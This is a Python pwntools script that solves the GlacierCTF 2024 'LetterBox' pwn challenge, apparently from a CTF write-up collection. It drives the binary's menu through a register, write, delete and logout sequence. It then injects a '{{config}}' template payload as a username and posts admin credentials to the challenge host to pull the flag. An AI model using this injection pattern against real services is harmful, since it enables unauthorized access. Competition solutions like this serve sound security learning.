#!/usr/bin/env python3
from pwn import *
import os
import re
import requests
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/GlacierCTF 2024/pwn/LetterBox/main')
elf = ELF(TARGET)

def _register(r, username, password):
    r.sendlineafter(b'Exit\n', b'1')
    r.sendlineafter(b'username: \n', username)
    r.sendlineafter(b'password: \n', password)

def _login(r, username, password):
    r.sendlineafter(b'Exit\n', b'2')
    r.sendlineafter(b'username: \n', username)
    r.sendlineafter(b'password: \n', password)

def _exit(r):
    r.sendlineafter(b'Exit\n', b'3')

def _write_message(r, content):
    r.sendlineafter(b'Logout\n', b'1')
    r.sendlineafter(b'content: \n', content)

def _delete_message(r, id):
    r.sendlineafter(b'Logout\n', b'2')
    r.sendlineafter(b'delete: \n', str(id).encode())

def _send_all_messages(r):
    r.sendlineafter(b'Logout\n', b'3')


def _logout(r):
    r.sendlineafter(b'Logout\n', b'4')

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    _register(r, b'A', b'A')
    _login(r, b'A', b'A')
    _write_message(r, b'A')
    _delete_message(r, 0)
    _logout(r)

    _register(r, b'{{config}}', b'A')
    _login(r, b'{{config}}', b'A')
    _send_all_messages(r)

    response = requests.post('https://c31d81e1c27f521837d040840f0de851.mailweb.web.glacierctf.com', data={'username': 'admin@email.com', 'password': 'admin'})

    print(re.search('gctf{[^}]+}', response.text).group(0))

    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('challs.glacierctf.com', 20566)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
